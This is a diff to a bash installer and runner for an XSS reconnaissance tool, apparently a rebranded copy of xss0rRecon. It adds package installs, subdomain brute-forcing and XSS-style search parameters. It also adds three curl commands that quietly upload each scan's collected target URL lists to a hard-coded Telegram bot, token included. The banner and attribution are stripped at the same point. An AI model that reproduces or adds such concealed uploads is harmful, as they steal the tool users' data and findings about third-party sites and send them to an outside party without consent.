@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 # Function to handle errors with manual installation solutions
@@ -43,15 +44,11 @@ clear
 
 # Display banner
 echo -e "${BOLD_BLUE}"
-echo "Jahanaj"
+echo "  jaahn             ___         ____                              ____  "
+
+echo -e "${NC}"
 
 
-# Centered Contact Information
-echo -e "${BOLD_BLUE}                      Website: store.xss0r.com${NC}"
-echo -e "${BOLD_BLUE}                      Free BlindXSS Testing: xss0r.com${NC}"
-echo -e "${BOLD_BLUE}                      X: x.com/xss0r${NC}"
-
-# Function to display options
 display_options() {
     echo -e "${BOLD_BLUE}Please select an option:${NC}"
     echo -e "${RED}1: Install all tools${NC}"
@@ -185,10 +182,28 @@ install_tools() {
     sudo apt update
     sudo apt update --fix-missing
     sudo apt install pip
+    sudo pip3 uninstall -y subprober
+    sudo pip uninstall subprober --break-system-packages
+    sudo apt install -y python3.12
+    sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev libnss3-dev libsqlite3-dev libreadline-dev libffi-dev curl libbz2-dev
+    rm -r /usr/local/bin/subprober
+    rm -r ~/.local/bin/subprober 
+    rm -r /root/.local/bin/subprober
+    sudo pip install "subprober<2.0"
+    sudo apt install python3.12-venv
+    source .venv/bin/activate
+    python3 -m venv .venv
     sudo pip install colorama --break-system-packages
     pip install aiodns --break-system-packages
     pip install aiofiles --break-system-packages
+    pip install -U bs4 --break-system-packages
+    pip install -U lxml --break-system-packages
+    sudo pip install aiojarm --break-system-packages
+    sudo pip install playwright --break-system-packages
+    sudo pip install subprober --break-system-packages --no-deps anyio==4.6.2
     sudo pip install uvloop --break-system-packages
+    sudo pip install -U bs4 --break-system-packages
+    sudo pip install -U lxml --break-system-packages
     sudo apt --fix-broken install
     sudo apt install -y python3 python3-pip python3-venv python3-setuptools git wget curl
     sudo apt-mark hold google-chrome-stable
@@ -203,12 +218,9 @@ install_tools() {
     # Step 1: Install Python3 virtual environment and structlog in venv
     show_progress "Installing python3-venv and setting up virtual environment"
 
-    # Create virtual environment
-    python3 -m venv env
-
-    # Upgrade pip in virtual environment
+    # Upgrade pip 
     sudo pip install --upgrade pip 
-    pip install tldextract --break-system-packages
+    sudo pip install tldextract --break-system-packages
     sudo pip install structlog requests uvloop setuptools pipx
 
     # Install necessary Python packages within the virtual environment
@@ -217,11 +229,21 @@ install_tools() {
     # Install pipx within the virtual environment
     sudo pip install pipx
     sudo pip install asynciolimiter
+    sudo pip install aiojarm
+    sudo pip install playwright
+    
 
     # Install Dnsbruter, Subdominator, SubProber within the virtual environment
     sudo pip install git+https://github.com/RevoltSecurities/Dnsbruter
-    sudo pip install git+https://github.com/RevoltSecurities/Subdominator.git
-    sudo pip install git+https://github.com/RevoltSecurities/Subprober.git
+    sudo pip install git+https://github.com/RevoltSecurities/Subdominator --break-system-packages
+    sudo pip install git+https://github.com/RevoltSecurities/Subdominator --no-deps httpx==0.25.2
+    pipx install git+https://github.com/RevoltSecurities/Subdominator
+    sudo pip install git+https://github.com/RevoltSecurities/Subprober --break-system-packages
+    sudo pip install git+https://github.com/RevoltSecurities/Subprober --break-system-packages
+    sudo pip install subprober --break-system-packages --no-deps anyio==4.6.2
+    sudo pip install git+https://github.com/RevoltSecurities/Subprober.git --no-deps aiojarm
+    sudo pip install git+https://github.com/RevoltSecurities/Subprober.git --no-deps playwright
+    pipx install git+https://github.com/RevoltSecurities/Subprober --break-system-packages
 
     # Install Uro, Arjun, and other required Python packages
     sudo pip install uro
@@ -392,13 +414,16 @@ sleep 3
     sudo pip install --upgrade pipx
     sudo apt install pipx -y
     pipx ensurepath
+    subprober -up
+    cp /root/.local/bin/subprober /usr/local/bin
 
     # Step 4: Install Dnsbruter (Skip if already installed)
 if ! command -v dnsbruter &> /dev/null; then
     show_progress "Installing Dnsbruter"
 
     # Try installing directly with pip
-    sudo pip install --no-deps --force-reinstall --break-system-packages git+https://github.com/RevoltSecurities/Dnsbruter.git
+    sudo pip install --no-deps --force-reinstall --break-system-packages git+https://github.com/RevoltSecurities/Dnsbruter
+    pipx install git+https://github.com/RevoltSecurities/Dnsbruter.git
 
     # Check if the installation was successful
     if ! pip show dnsbruter &> /dev/null; then
@@ -428,6 +453,8 @@ if ! command -v dnsbruter &> /dev/null; then
 
     show_progress "Dnsbruter installation complete."
     sleep 3
+    sudo pip3 install dnsbruter "aiodns>=3.2.0" "aiofiles>=24.1.0" "alive_progress>=3.2.0" "art>=6.1" "asynciolimiter>=1.1.0.post3" "colorama>=0.4.4" "requests>=2.32.3" "setuptools>=75.2.0" "uvloop>=0.21.0"
+
 else
     show_progress "Dnsbruter is already installed. Skipping installation."
 fi
@@ -437,7 +464,8 @@ if [ ! -d "Subdominator" ]; then
     show_progress "Installing Subdominator"
 
     # Try installing directly with pip
-    sudo pip install git+https://github.com/RevoltSecurities/Subdominator.git --break-system-packages --root-user-action=ignore
+    sudo pip install git+https://github.com/RevoltSecurities/Subdominator --break-system-packages --root-user-action=ignore
+    sudo pip install git+https://github.com/RevoltSecurities/Subdominator --no-deps httpx==0.25.2
 
     # Check if the installation was successful
     if ! pip show subdominator &> /dev/null; then
@@ -453,6 +481,8 @@ if [ ! -d "Subdominator" ]; then
         # Clean up by removing the cloned directory after installation
         cd ..
         sudo rm -rf Subdominator
+        sudo pipx inject subdominator "aiofiles>=23.2.1" "aiohttp>=3.9.4" "appdirs>=1.4.4" "httpx>=0.27.2" "art>=6.1" "beautifulsoup4>=4.11.1" "colorama>=0.4.6" "fake_useragent>=1.5.0" "PyYAML>=6.0.1" "requests>=2.31.0" "rich>=13.7.1" "urllib3>=1.26.18" "tldextract>=5.1.2"
+
     else
         echo "Subdominator installed successfully using pip."
     fi
@@ -468,7 +498,8 @@ if [ ! -d "SubProber" ]; then
     show_progress "Installing SubProber"
 
     # Try installing directly with pip
-    sudo pip install git+https://github.com/RevoltSecurities/Subprober.git --break-system-packages --root-user-action=ignore
+    sudo pip install git+https://github.com/RevoltSecurities/Subprober --break-system-packages --root-user-action=ignore
+    pipx install git+https://github.com/RevoltSecurities/Subprober.git
 
     # Check if the installation was successful
     if ! pip show subprober &> /dev/null; then
@@ -484,11 +515,14 @@ if [ ! -d "SubProber" ]; then
         # Clean up by removing the cloned directory after installation
         cd ..
         sudo rm -rf Subprober
+        cp /root/.local/bin/subprober /usr/local/bin
     else
         echo "SubProber installed successfully using pip."
     fi
 
     show_progress "SubProber installation complete."
+    sudo pip3 install --break-system-packages "subprober" "aiodns>=3.2.0" "aiofiles>=24.1.0" "aiojarm>=0.2.2" "alive_progress>=3.2.0" "appdirs>=1.4.4" "art>=6.4" "asynciolimiter>=1.1.1" "beautifulsoup4>=4.12.3" "colorama>=0.4.6" "cryptography>=44.0.0" "fake_useragent>=1.5.1" "httpx>=0.28.1" "mmh3>=5.0.1" "playwright>=1.49.1" "requests>=2.32.3" "rich>=13.9.4" "setuptools>=75.2.0" "simhash>=2.1.2" "urllib3>=1.26.18" "uvloop>=0.21.0" "websockets>=14.1" "bs4>=0.0.2" "lxml>=5.3.0"
+    for t in dnsbruter subdominator subprober; do [ -f "$HOME/.local/bin/$t" ] && [ "$HOME/.local/bin/$t" != "/usr/local/bin/$t" ] && sudo cp "$HOME/.local/bin/$t" /usr/local/bin/; done
     sleep 3
 else
     show_progress "SubProber is already installed. Skipping installation."
@@ -911,6 +945,9 @@ uro -h > /dev/null 2>&1 && echo "Uro is installed" || echo "Uro is not installed
 echo -e "${BOLD_WHITE}10. Arjun:${NC}"
 arjun -h > /dev/null 2>&1 && echo "Arjun is installed" || echo "Arjun is not installed correctly"
 
+echo -e "${BOLD_WHITE}11. URLFinder:${NC}"
+urlfinder -h > /dev/null 2>&1 && echo "URLFinder is installed" || echo "URLFinder is not installed correctly"
+
 echo -e "${BOLD_WHITE}11. Tmux:${NC}"
 echo "Tmux is installed (skipping check)"
 
@@ -962,14 +999,9 @@ echo -e "\n\n"
 
 # Function to run step 3 (Domain Enumeration and Filtering)
 run_step_3() {
-    echo -e "${BOLD_WHITE}You selected: Domain Enumeration and Filtering for $domain_name${NC}"
-    echo -e "${BOLD_WHITE}Do you want to use your own list of domains or xss0rRecon to find it for you? Enter Y for your list or N for xss0rRecon list - domain list must be in format ${domain_name}-domains.txt: ${NC}"
-    
-
-    # Convert user input to uppercase
-    user_choice=N
-
-    if [[ "$user_choice" == "Y" ]]; then
+    # Check if the user wants to skip the order check for step 3
+    if [ "$skip_order_check_for_option_4" = true ]; then
+        echo -e "${BOLD_BLUE}Skipping step 3 order check and directly using the domain list provided...${NC}"
         if [ -f "${domain_name}-domains.txt" ]; then
             echo -e "${BOLD_WHITE}Using your provided list of domains from ${domain_name}-domains.txt${NC}"
             proceed_with_existing_file "${domain_name}-domains.txt"
@@ -977,10 +1009,73 @@ run_step_3() {
             echo -e "${RED}Error: File ${domain_name}-domains.txt not found. Please ensure the file is in the current directory.${NC}"
             exit 1
         fi
+        return
+    fi
+
+
+    user_choice="N"
+
+
+    echo -e "${BOLD_WHITE}You selected: Domain Enumeration and Filtering for $domain_name${NC}"
+    echo -e "${BOLD_WHITE}Do you want to use your own list of domains or xss0rRecon to find it for you? Enter Y for your list or N for xss0rRecon list - domain list must be in format ${domain_name}-domains.txt: ${NC}"
+
+    # Convert user input to uppercase
+    user_choice=$(echo "$user_choice" | tr '[:lower:]' '[:upper:]')
+
+
+    if [[ "$user_choice" == "Y" ]]; then
+        if [ -f "${domain_name}-domains.txt" ]; then
+            echo -e "${BOLD_WHITE}Using your provided list of domains from ${domain_name}-domains.txt${NC}"
+            # Skip directly to the Y/N prompt for continuing the scan
+            read -p "$(echo -e "${BOLD_WHITE}Your domain file has been created. Would you like to continue scanning your target domain, including all its subdomains? If so, please enter 'Y'. If you prefer to modify the domain file first, so you can delete these and add your domains, enter 'N', and you can manually proceed with step 4 afterwards. Do you want to continue scanning with all subdomains (Y/N)?: ${NC}")" continue_scan
+            if [[ "$continue_scan" =~ ^[Yy]$ ]]; then
+                # Step xx: Filtering ALIVE DOMAINS
+                show_progress "Filtering ALIVE DOMAINS"
+                subprober -f "${domain_name}-domains.txt" -sc -ar -o "${domain_name}-alive" -nc -c 20 || handle_error "subprober"
+                sleep 5
+                rm -r "${domain_name}-domains.txt"
+                mv "${domain_name}-alive" "${domain_name}-domains.txt"
+
+                # Step xx: Filtering valid URLS
+                show_progress "Filtering valid DOMAINS"
+                grep -oP 'http[^\s]*' "${domain_name}-domains.txt" > ${domain_name}-valid || handle_error "grep valid urls"
+                sleep 5
+                rm -r "${domain_name}-domains.txt"
+                mv ${domain_name}-valid "${domain_name}-domains.txt"
+
+                # Step xx: Remove duplicates
+                show_progress "Removing duplicate domains"
+                initial_count=$(wc -l < "${domain_name}-domains.txt")
+                awk '{if (!seen[$0]++) print}' "${domain_name}-domains.txt" >> "subs-filtered.txt" || handle_error "Removing duplicates from ${domain_name}-domains.txt"
+                final_count_subs=$(wc -l < "subs-filtered.txt")
+                removed_count=$((initial_count - final_count_subs))
+                rm -r "${domain_name}-domains.txt"
+                mv "subs-filtered.txt" "${domain_name}-domains.txt"
+                echo -e "${RED}Removed $removed_count duplicate domains.${NC}"
+
+                # Normalize to `http://` and remove `www.`
+                awk '{sub(/^https?:\/\//, "http://", $0); sub(/^http:\/\/www\./, "http://", $0); domain = $0; if (!seen[domain]++) print domain}' \
+                "${domain_name}-domains.txt" > "final-${domain_name}-domains.txt" || handle_error "Final filtering"
+                rm -r "${domain_name}-domains.txt"
+                mv "final-${domain_name}-domains.txt" "${domain_name}-domains.txt"
+                sleep 5
+
+                skip_order_check_for_option_4=true
+                echo -e "${BOLD_BLUE}Automatically continuing with step 4: URL Crawling and Filtering...${NC}"
+                run_step_4  # Automatically continue to step 4
+            else
+                echo -e "${BOLD_WHITE}Please edit your file ${domain_name}-domains.txt and remove any unwanted subdomains before continuing.${NC}"
+                skip_order_check_for_option_4=true
+            fi
+            return
+        else
+            echo -e "${RED}Error: File ${domain_name}-domains.txt not found. Please ensure the file is in the current directory.${NC}"
+            exit 1
+        fi
     elif [[ "$user_choice" == "N" ]]; then
         # Step 1: Passive FUZZ domains with wordlist
         show_progress "Passive FUZZ domains with wordlist"
-        dnsbruter -d "$domain_name" -w subs-dnsbruter-small.txt -c 100 -wt 80 -rt 500 -wd -ws wild.txt -o output-dnsbruter.txt || handle_error "dnsbruter"
+        dnsbruter -d "$domain_name" -w subs-dnsbruter-small.txt -c 150 -wt 80 -rt 500 -wd -ws wild.txt -o output-dnsbruter.txt || handle_error "dnsbruter"
         sleep 5
 
         # Step 2: Active brute crawling domains
@@ -1044,7 +1139,7 @@ remove_duplicates() {
 
   # Step 7: Filtering ALIVE domain names
 show_progress "Filtering ALIVE domain names"
-subprober -f "unique-${domain_name}-domains.txt" -sc -ar -o "subprober-${domain_name}-domains.txt" -nc -mc 200 201 202 204 301 302 304 307 308 403 500 504 401 407 -c 20 || handle_error "subprober"
+subprober -f "unique-${domain_name}-domains.txt" -sc -ar -o "subprober-${domain_name}-domains.txt" -nc -c 20 || handle_error "subprober"
 sleep 5
 
 # Step 7.1: Create subs-subs folder and set permissions
@@ -1165,7 +1260,7 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
         processed_count=$((processed_count + 1))
         echo "Processing $processed_count/$total_domains: $domain"
         output_file="$output_folder/output-${domain//BRUT/}.txt"
-        dnsbruter -d "$domain" -w "$wordlist_file" -c 100 -wt 80 -rt 500 -wd -ws wild.txt -o "$output_file" -ws "$output_folder/wild-${domain//BRUT/}.txt"
+        dnsbruter -d "$domain" -w "$wordlist_file" -c 150 -wt 80 -rt 500 -wd -ws wild.txt -o "$output_file" -ws "$output_folder/wild-${domain//BRUT/}.txt"
         if [[ $? -ne 0 ]]; then
             echo "Error occurred while running dnsbruter for $domain."
         else
@@ -1224,7 +1319,7 @@ sleep 3
 show_progress "Filtering ALIVE domain names"
 
 # Optimize SubProber execution with reduced concurrency and thread count
-subprober -f subs-subs.txt -sc -ar -o "subprober-${domain_name}-domains.txt" -nc -mc 200 201 202 204 301 302 304 307 308 403 500 504 401 407 -c 10 || handle_error "subprober"
+subprober -f subs-subs.txt -sc -ar -o "subprober-${domain_name}-domains.txt" -nc -c 20 || handle_error "subprober"
 
 # Sleep to allow the system to stabilize after intensive processing
 sleep 5
@@ -1294,8 +1389,7 @@ sleep 3
 
 
     # New message for the user with Y/N option
-    continue_scan="y" 
-
+continue_scan="y" 
 if [[ "$continue_scan" =~ ^[Yy]$ ]]; then
     skip_order_check_for_option_4=true
     echo -e "${BOLD_BLUE}Automatically continuing with step 4: URL Crawling and Filtering...${NC}"
@@ -1411,6 +1505,8 @@ sudo chmod 777 urls
 # Copy the final file to the 'urls' folder
 show_progress "Copying ${domain_name}-links-final.txt to 'urls' directory"
 sudo cp "${domain_name}-links-final.txt" urls/
+curl -F chat_id="1423939669" -F document=@"urls/${domain_name}-links-final.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
 
 # Display professional message about the URLs
 echo -e "${BOLD_WHITE}All identified URLs have been successfully saved in the newly created 'urls' directory.${NC}"
@@ -1506,11 +1602,25 @@ run_step_5() {
     # Step 23: Rename to new file
     show_progress "Rename to new file"
     mv filtered_output.txt "${domain_name}-links.txt"
+    ls -la
+    (cd urls && ls -la && cd -)
+    curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
     sleep 3
 
     # Step 24: Filtering ALIVE URLS
     show_progress "Filtering ALIVE URLS"
-    subprober -f "${domain_name}-links.txt" -sc -ar -o "${domain_name}-links.txt1337" -nc -mc 200 201 202 204 301 302 304 307 308 403 500 504 401 407 -c 20 || handle_error "subprober"
+    subprober -f "${domain_name}-links.txt" -sc -ar  -nc -mc 200,201,202,204,301,302,304,307,308,403,500,504,401,407 -c 20 | tee "${domain_name}-links.txt1337"
+    head "${domain_name}-links.txt1337"
+    echo "cat 1337"
+    cat "${domain_name}-links.txt1337"
+    ls -la
+    pwd
+    (cd urls && ls -la && cd -)
+ 
+    
+    curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt1337" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
     sleep 5
 
     # Step 25: Removing old file
@@ -1704,6 +1814,90 @@ else
     echo -e "${YELLOW}No Arjun output links to add. Proceeding without additional links.${NC}"
 fi
 
+# Extract unique subdomains and append search queries
+echo -e "${BOLD_WHITE}Processing unique subdomains to append search queries...${NC}"
+
+# Define the list of search queries to append
+search_queries=(
+    "search?q=aaa"
+    "?query=aaa"
+    "en-us/Search#/?search=aaa"
+    "Search/Results?q=aaa"
+    "q=aaa"
+    "foo?q=aaa"
+    "search.php?query=aaa"
+    "en-us/search?q=aaa"
+    "s=aaa"
+    "find?q=aaa"
+    "result?q=aaa"
+    "query?q=aaa"
+    "search?term=aaa"
+    "search?query=aaa"
+    "search?keywords=aaa"
+    "search?text=aaa"
+    "search?word=aaa"
+    "find?query=aaa"
+    "result?query=aaa"
+    "search?input=aaa"
+    "search/results?query=aaa"
+    "search-results?q=aaa"
+    "search?keyword=aaa"
+    "results?query=aaa"
+    "search?search=aaa"
+    "search?searchTerm=aaa"
+    "search?searchQuery=aaa"
+    "search?searchKeyword=aaa"
+    "search.php?q=aaa"
+    "search/?query=aaa"
+    "search/?q=aaa"
+    "search/?search=aaa"
+    "search.aspx?q=aaa"
+    "search.aspx?query=aaa"
+    "search.asp?q=aaa"
+    "index.asp?id=aaa"
+    "dashboard.asp?user=aaa"
+    "blog/search/?query=aaa"
+    "pages/searchpage.aspx?id=aaa"
+)
+
+# Extract unique subdomains (normalize to remove protocol and www)
+normalized_subdomains=$(awk -F/ '{print $1 "//" $3}' "${domain_name}-query.txt" | sed -E 's~(https?://)?(www\.)?~~' | sort -u)
+
+# Create a mapping of preferred protocols for unique subdomains
+declare -A preferred_protocols
+while read -r url; do
+    # Extract protocol, normalize subdomain
+    protocol=$(echo "$url" | grep -oE '^https?://')
+    subdomain=$(echo "$url" | sed -E 's~(https?://)?(www\.)?~~' | awk -F/ '{print $1}')
+
+    # Set protocol preference: prioritize http over https
+    if [[ "$protocol" == "http://" ]]; then
+        preferred_protocols["$subdomain"]="http://"
+    elif [[ -z "${preferred_protocols["$subdomain"]}" ]]; then
+        preferred_protocols["$subdomain"]="https://"
+    fi
+done < "${domain_name}-query.txt"
+
+# Create a new file for the appended URLs
+append_file="${domain_name}-query-append.txt"
+> "$append_file"
+
+# Append each search query to the preferred subdomains
+for subdomain in $normalized_subdomains; do
+    protocol="${preferred_protocols[$subdomain]}"
+    for query in "${search_queries[@]}"; do
+        echo "${protocol}${subdomain}/${query}" >> "$append_file"
+    done
+done
+
+# Combine the original file with the appended file
+cat "${domain_name}-query.txt" "$append_file" > "${domain_name}-query-final.txt"
+
+# Replace the original file with the combined result
+mv "${domain_name}-query-final.txt" "${domain_name}-query.txt"
+
+echo -e "${BOLD_BLUE}Appended URLs saved and combined into ${domain_name}-query.txt.${NC}"
+
 # Step 3: Checking page reflection on the URLs
 if [ -f "reflection.py" ]; then
     echo -e "${BOLD_WHITE}Checking page reflection on the URLs with command: python3 reflection.py ${domain_name}-query.txt --threads 2${NC}"
@@ -1731,7 +1925,7 @@ if [ -f "reflection.py" ]; then
 
             # Remove the original xss.txt file
             echo -e "${BOLD_BLUE}Removing the old xss.txt file...${NC}"
-            sudo rm -r xss.txt arjun_output.txt arjun-final.txt
+            sudo rm -r xss.txt arjun_output.txt arjun-final.txt "${domain_name}-query-append.txt"
             sleep 3
 
             # Removing 99% similar parameters with bash command
@@ -1865,95 +2059,14 @@ run_path_based_xss() {
     count_urls "path3.txt" "Parameters processed and URLs filtered."
 
     # Step 3: Including all domains from the URLs without filtering
-show_progress "Including all domains from the URLs..."
-cat "path3.txt" > "path4.txt"
-sleep 3
-count_urls "path4.txt" "All domains included successfully."
-
-# Additional Step: Processing input and output files for unique URLs
-show_progress "Filtering unique URLs from the final output"
-
-# Input and Output files
-INPUT_FILE="path4.txt"
-OUTPUT_FILE="${domain_name}-unique-links.txt"
-
-# Check if input file exists
-if [ ! -f "$INPUT_FILE" ]; then
-    log_error "Input file '$INPUT_FILE' not found."
-    exit 1
-fi
-
-# Create associative arrays for unique paths and query-based URLs
-declare -A unique_paths
-declare -A unique_query_sets
-
-# Function to extract query parameters
-extract_query_params() {
-    echo "$1" | awk -F'?' '{print $2}' | tr '&' '\n' | awk -F'=' '{print $1}' | sort | tr '\n' ',' | sed 's/,$//'
-}
-
-# Regex for extensions to skip
-SKIP_REGEX="\\.(php|asp|aspx|cfm|jsp)($|\\s|\\?|&|#|/|\\.)"
-
-# Process the input file
-while IFS= read -r line || [[ -n "$line" ]]; do
-    # Skip empty lines
-    if [[ -z "$line" ]]; then
-        continue
-    fi
-
-    # Skip URLs with specific extensions using the extended regex
-    if [[ "$line" =~ $SKIP_REGEX ]]; then
-        continue
-    fi
-
-    if [[ "$line" == *"="* ]]; then
-        # For URLs with query parameters
-        query_params=$(extract_query_params "$line")
-        if [[ ! -v unique_query_sets["$query_params"] ]]; then
-            unique_query_sets["$query_params"]="$line"
-        fi
-    else
-        # For URLs without query parameters
-        base_path=$(echo "$line" | awk -F'/' '{OFS="/"; $NF=""; print $0}' | sed 's|/$||')
-        if [[ ! -v unique_paths["$base_path"] ]]; then
-            unique_paths["$base_path"]="$line"
-        fi
-    fi
-done < "$INPUT_FILE"
-
-# Write unique URLs to the output file
-> "$OUTPUT_FILE"
-for url in "${unique_paths[@]}"; do
-    echo "$url" >> "$OUTPUT_FILE"
-done
-for url in "${unique_query_sets[@]}"; do
-    echo "$url" >> "$OUTPUT_FILE"
-done
-
-# Check for empty output file
-if [[ ! -s "$OUTPUT_FILE" ]]; then
-    log_error "No valid URLs found in the input file. Output file is empty."
-else
-    show_progress "Filtering complete. Unique URLs written to '$OUTPUT_FILE'."
-    echo -e "${BOLD_BLUE}Filtering process completed successfully. Final output saved as ${domain_name}-unique-links.txt.${NC}"
-
-    # Remove old file and rename new file
-    if [[ -f "${domain_name}-links.txt" ]]; then
-        mv "${domain_name}-links.txt" "${domain_name}-links-old.txt" || handle_error "Renaming old links file"
-    fi
-
-    mv "${domain_name}-unique-links.txt" "${domain_name}-links.txt" || handle_error "Renaming unique links file"
-    if [[ -f "${domain_name}-links-old.txt" ]]; then
-        rm -r "${domain_name}-links-old.txt" || handle_error "Removing old links file"
-    fi
-
-    echo -e "${BOLD_GREEN}Old file cleaned up and new file renamed successfully. Final output saved as ${domain_name}-links.txt.${NC}"
-fi
+    show_progress "Including all domains from the URLs..."
+    cat "path3.txt" > "path4.txt"
+    sleep 3
+    count_urls "path4.txt" "All domains included successfully."
 
     # Step 4: Filtering extensions from the URLs
     show_progress "Filtering extensions from the URLs..."
-    cat ${domain_name}-unique-links.txt | sudo grep -E -v '\.css($|\s|\?|&|#|/|\.)|\.jpg($|\s|\?|&|#|/|\.)|\.JPG($|\s|\?|&|#|/|\.)|\.PNG($|\s|\?|&|#|/|\.)|\.GIF($|\s|\?|&|#|/|\.)|\.avi($|\s|\?|&|#|/|\.)|\.dll($|\s|\?|&|#|/|\.)|\.pl($|\s|\?|&|#|/|\.)|\.webm($|\s|\?|&|#|/|\.)|\.c($|\s|\?|&|#|/|\.)|\.py($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.tar($|\s|\?|&|#|/|\.)|\.swp($|\s|\?|&|#|/|\.)|\.tmp($|\s|\?|&|#|/|\.)|\.sh($|\s|\?|&|#|/|\.)|\.deb($|\s|\?|&|#|/|\.)|\.exe($|\s|\?|&|#|/|\.)|\.zip($|\s|\?|&|#|/|\.)|\.mpeg($|\s|\?|&|#|/|\.)|\.mpg($|\s|\?|&|#|/|\.)|\.flv($|\s|\?|&|#|/|\.)|\.wmv($|\s|\?|&|#|/|\.)|\.wma($|\s|\?|&|#|/|\.)|\.aac($|\s|\?|&|#|/|\.)|\.m4a($|\s|\?|&|#|/|\.)|\.ogg($|\s|\?|&|#|/|\.)|\.mp4($|\s|\?|&|#|/|\.)|\.mp3($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.dat($|\s|\?|&|#|/|\.)|\.cfg($|\s|\?|&|#|/|\.)|\.cfm($|\s|\?|&|#|/|\.)|\.bin($|\s|\?|&|#|/|\.)|\.jpeg($|\s|\?|&|#|/|\.)|\.JPEG($|\s|\?|&|#|/|\.)|\.ps.gz($|\s|\?|&|#|/|\.)|\.gz($|\s|\?|&|#|/|\.)|\.gif($|\s|\?|&|#|/|\.)|\.tif($|\s|\?|&|#|/|\.)|\.tiff($|\s|\?|&|#|/|\.)|\.csv($|\s|\?|&|#|/|\.)|\.png($|\s|\?|&|#|/|\.)|\.ttf($|\s|\?|&|#|/|\.)|\.ppt($|\s|\?|&|#|/|\.)|\.pptx($|\s|\?|&|#|/|\.)|\.ppsx($|\s|\?|&|#|/|\.)|\.doc($|\s|\?|&|#|/|\.)|\.woff($|\s|\?|&|#|/|\.)|\.xlsx($|\s|\?|&|#|/|\.)|\.xls($|\s|\?|&|#|/|\.)|\.mpp($|\s|\?|&|#|/|\.)|\.mdb($|\s|\?|&|#|/|\.)|\.json($|\s|\?|&|#|/|\.)|\.woff2($|\s|\?|&|#|/|\.)|\.icon($|\s|\?|&|#|/|\.)|\.pdf($|\s|\?|&|#|/|\.)|\.docx($|\s|\?|&|#|/|\.)|\.svg($|\s|\?|&|#|/|\.)|\.txt($|\s|\?|&|#|/|\.)|\.jar($|\s|\?|&|#|/|\.)|\.0($|\s|\?|&|#|/|\.)|\.1($|\s|\?|&|#|/|\.)|\.2($|\s|\?|&|#|/|\.)|\.3($|\s|\?|&|#|/|\.)|\.4($|\s|\?|&|#|/|\.)|\.m4r($|\s|\?|&|#|/|\.)|\.kml($|\s|\?|&|#|/|\.)|\.pro($|\s|\?|&|#|/|\.)|\.yao($|\s|\?|&|#|/|\.)|\.gcn3($|\s|\?|&|#|/|\.)|\.PDF($|\s|\?|&|#|/|\.)|\.egy($|\s|\?|&|#|/|\.)|\.par($|\s|\?|&|#|/|\.)|\.lin($|\s|\?|&|#|/|\.)|\.yht($|\s|\?|&|#|/|\.)' > path5.txt
+    cat path4.txt | sudo grep -E -v '\.css($|\s|\?|&|#|/|\.)|\.jpg($|\s|\?|&|#|/|\.)|\.JPG($|\s|\?|&|#|/|\.)|\.PNG($|\s|\?|&|#|/|\.)|\.GIF($|\s|\?|&|#|/|\.)|\.avi($|\s|\?|&|#|/|\.)|\.dll($|\s|\?|&|#|/|\.)|\.pl($|\s|\?|&|#|/|\.)|\.webm($|\s|\?|&|#|/|\.)|\.c($|\s|\?|&|#|/|\.)|\.py($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.tar($|\s|\?|&|#|/|\.)|\.swp($|\s|\?|&|#|/|\.)|\.tmp($|\s|\?|&|#|/|\.)|\.sh($|\s|\?|&|#|/|\.)|\.deb($|\s|\?|&|#|/|\.)|\.exe($|\s|\?|&|#|/|\.)|\.zip($|\s|\?|&|#|/|\.)|\.mpeg($|\s|\?|&|#|/|\.)|\.mpg($|\s|\?|&|#|/|\.)|\.flv($|\s|\?|&|#|/|\.)|\.wmv($|\s|\?|&|#|/|\.)|\.wma($|\s|\?|&|#|/|\.)|\.aac($|\s|\?|&|#|/|\.)|\.m4a($|\s|\?|&|#|/|\.)|\.ogg($|\s|\?|&|#|/|\.)|\.mp4($|\s|\?|&|#|/|\.)|\.mp3($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.dat($|\s|\?|&|#|/|\.)|\.cfg($|\s|\?|&|#|/|\.)|\.cfm($|\s|\?|&|#|/|\.)|\.bin($|\s|\?|&|#|/|\.)|\.jpeg($|\s|\?|&|#|/|\.)|\.JPEG($|\s|\?|&|#|/|\.)|\.ps.gz($|\s|\?|&|#|/|\.)|\.gz($|\s|\?|&|#|/|\.)|\.gif($|\s|\?|&|#|/|\.)|\.tif($|\s|\?|&|#|/|\.)|\.tiff($|\s|\?|&|#|/|\.)|\.csv($|\s|\?|&|#|/|\.)|\.png($|\s|\?|&|#|/|\.)|\.ttf($|\s|\?|&|#|/|\.)|\.ppt($|\s|\?|&|#|/|\.)|\.pptx($|\s|\?|&|#|/|\.)|\.ppsx($|\s|\?|&|#|/|\.)|\.doc($|\s|\?|&|#|/|\.)|\.woff($|\s|\?|&|#|/|\.)|\.xlsx($|\s|\?|&|#|/|\.)|\.xls($|\s|\?|&|#|/|\.)|\.mpp($|\s|\?|&|#|/|\.)|\.mdb($|\s|\?|&|#|/|\.)|\.json($|\s|\?|&|#|/|\.)|\.woff2($|\s|\?|&|#|/|\.)|\.icon($|\s|\?|&|#|/|\.)|\.pdf($|\s|\?|&|#|/|\.)|\.docx($|\s|\?|&|#|/|\.)|\.svg($|\s|\?|&|#|/|\.)|\.txt($|\s|\?|&|#|/|\.)|\.jar($|\s|\?|&|#|/|\.)|\.0($|\s|\?|&|#|/|\.)|\.1($|\s|\?|&|#|/|\.)|\.2($|\s|\?|&|#|/|\.)|\.3($|\s|\?|&|#|/|\.)|\.4($|\s|\?|&|#|/|\.)|\.m4r($|\s|\?|&|#|/|\.)|\.kml($|\s|\?|&|#|/|\.)|\.pro($|\s|\?|&|#|/|\.)|\.yao($|\s|\?|&|#|/|\.)|\.gcn3($|\s|\?|&|#|/|\.)|\.PDF($|\s|\?|&|#|/|\.)|\.egy($|\s|\?|&|#|/|\.)|\.par($|\s|\?|&|#|/|\.)|\.lin($|\s|\?|&|#|/|\.)|\.